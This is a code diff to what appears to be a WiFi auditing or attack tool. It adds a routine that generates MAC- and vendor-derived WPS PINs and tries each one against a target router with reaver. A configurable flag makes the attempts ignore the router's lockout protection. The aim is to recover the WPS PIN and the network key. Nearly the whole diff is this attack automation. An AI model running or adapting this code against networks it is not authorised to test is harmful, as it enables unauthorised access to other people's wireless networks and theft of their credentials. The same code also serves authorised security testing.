@@ -14,6 +14,7 @@ from ..config import WifluxConfig
 from ..models import AccessPoint
 from ..process import which
 from .interface import recover_interface
+from .wps_pin import algorithmic_wps_pins
 
 
 class WPSAttack:
@@ -41,6 +42,12 @@ class WPSAttack:
         on_line: Optional[Callable[[str], None]] = None,
         should_stop: Optional[Callable[[], bool]] = None,
     ) -> tuple[str | None, str | None]:
+        if cfg.attack.algorithmic_wps and which("reaver"):
+            pin, key = WPSAttack._try_algorithmic_pins(
+                cfg, ap, timeout, on_line=on_line, should_stop=should_stop,
+            )
+            if key or (should_stop and should_stop()):
+                return pin, key
         if cfg.attack.use_bully and which("bully"):
             return WPSAttack._run_bully(
                 cfg, ap, timeout, pixie=False, on_line=on_line, should_stop=should_stop,
@@ -48,6 +55,43 @@ class WPSAttack:
         return WPSAttack._run_reaver(
             cfg, ap, timeout, pixie=False, on_line=on_line, should_stop=should_stop,
         )
+
+    @staticmethod
+    def _try_algorithmic_pins(
+        cfg: WifluxConfig,
+        ap: AccessPoint,
+        timeout: int,
+        *,
+        on_line: Optional[Callable[[str], None]] = None,
+        should_stop: Optional[Callable[[], bool]] = None,
+    ) -> tuple[str | None, str | None]:
+        pins = algorithmic_wps_pins(ap.bssid, ap.manufacturer)
+        if not pins:
+            return None, None
+        if on_line:
+            on_line(
+                f"[cyan]Algorithmic WPS[/]: trying {len(pins)} MAC/vendor-derived PIN(s)",
+            )
+        per_pin = max(12, min(30, timeout // max(len(pins), 1)))
+        iface = recover_interface(cfg.scan.interface, ap.channel, band=ap.radio_band)
+        for pin in pins:
+            if should_stop and should_stop():
+                break
+            if on_line:
+                on_line(f"[cyan]Algorithmic PIN[/] → {pin}")
+            cmd = [
+                "reaver", "-i", iface, "-b", ap.bssid, "-c", str(ap.channel),
+                "-p", pin, "-f", "-vv",
+            ]
+            if cfg.attack.wps_ignore_locks:
+                cmd.append("-L")
+            got_pin, key = WPSAttack._stream_cmd(
+                cmd, per_pin, on_line, should_stop,
+                pixie=False, ignore_locks=cfg.attack.wps_ignore_locks,
+            )
+            if key:
+                return got_pin or pin, key
+        return None, None
 
     @staticmethod
     def run_reaver_pixie(
